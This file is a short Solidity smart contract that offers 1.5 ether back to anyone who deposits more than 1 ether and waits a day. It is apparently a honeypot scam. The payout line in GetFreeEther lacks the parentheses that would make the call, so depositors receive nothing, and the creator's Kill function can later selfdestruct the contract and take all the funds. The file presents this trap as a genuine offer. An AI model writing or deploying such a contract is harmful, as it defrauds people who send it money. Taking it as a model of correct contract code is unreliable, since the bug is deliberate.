pragma solidity ^0.4.19;

contract QUICK_DEPOSIT_FOR_FUN    
{
    address creator = msg.sender;
    uint256 public LastExtractTime;
    mapping (address=>uint256) public ExtractDepositTime;
    uint256 public freeEther;
    
    function Deposit()
    public
    payable
    {
        if(msg.value> 1 ether && freeEther >= 0.5 ether)
        {
            LastExtractTime = now + 1 days;
            ExtractDepositTime[msg.sender] = LastExtractTime;
            freeEther-=0.5 ether;
        }
    }
    
    function GetFreeEther()
    public
    payable
    {
        if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now)
        {
            msg.sender.call.value(1.5 ether);
            ExtractDepositTime[msg.sender] = 0;
        }
    }
    
    function PutFreeEther()
    public
    payable
    {
        uint256 newVal = freeEther+msg.value;
        if(newVal>freeEther)freeEther=newVal;
    }
    
    function Kill()
    public
    payable
    {
        if(msg.sender==creator && now>LastExtractTime + 2 days)
        {
            selfdestruct(creator);
        }
        else revert();
    }
    
    function() public payable{}
}